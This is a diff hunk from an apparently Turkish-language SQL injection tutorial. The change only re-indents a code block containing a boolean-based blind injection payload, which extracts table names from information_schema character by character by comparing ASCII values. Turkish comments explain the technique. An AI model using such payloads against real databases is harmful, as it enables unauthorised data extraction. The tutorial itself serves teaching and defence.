@@ -179,17 +179,18 @@
         * ***'LIMIT'*** adı üstünde sorguya bir limit koyuyor. 
 * 
         ```SQL
-            SELECT * FROM haberler WHERE 
-            id = 1 and ASCII(
-                SUBSTRING(
-                    (SELECT table_name FROM information_schema.tables WHERE --> database'den veri çekmek için yukarıda gösterdiğimiz sorguların aynısı.
-                    table_schema=database() LIMIT 1,1) #users --> Burada limit koyuyoruz çünkü almak istediğimiz verileri daraltmak için. Yoksa her tarafta veri olur.
-                    ,1  --> tahmini string users yazdık ve ilk harfinin veritabanında uyuşup uyuşmadığını öğrenmek istiyoruz.
-                    ,1
-                )
-            )> 80 --> Sıcak soğuk oyunu tarzı bir oyun başlıyor.
+        
+                SELECT * FROM haberler WHERE 
+                id = 1 and ASCII(
+                    SUBSTRING(
+                        (SELECT table_name FROM information_schema.tables WHERE --> database'den veri çekmek için yukarıda gösterdiğimiz sorguların aynısı.
+                        table_schema=database() LIMIT 1,1) #users --> Burada limit koyuyoruz çünkü almak istediğimiz verileri daraltmak için. Yoksa her tarafta veri olur.
+                        ,1  --> tahmini string users yazdık ve ilk harfinin veritabanında uyuşup uyuşmadığını öğrenmek istiyoruz.
+                        ,1
+                    )
+                )> 80 --> Sıcak soğuk oyunu tarzı bir oyun başlıyor.
 
-            --> biz 'users' ilk harfinin eşleşip eşleşmediğini bulmak istiyoruz. 'u' harfinin ASCII tablosundaki sayı karşılığı 117. Dolayısıyla 117>80 olduğu için burada eğer veritabanındaki stringde gerçekten 'u' harfi varsa burası TRUE dönecek. Buradaki 80 sayısını artırıp azaltarak istediğimiz karakterlerin veritabanında var olup olmadığını anlayabiliriz. 
+                --> biz 'users' ilk harfinin eşleşip eşleşmediğini bulmak istiyoruz. 'u' harfinin ASCII tablosundaki sayı karşılığı 117. Dolayısıyla 117>80 olduğu için burada eğer veritabanındaki stringde gerçekten 'u' harfi varsa burası TRUE dönecek. Buradaki 80 sayısını artırıp azaltarak istediğimiz karakterlerin veritabanında var olup olmadığını anlayabiliriz. 
 
 ## TIME BASED SQLi
 
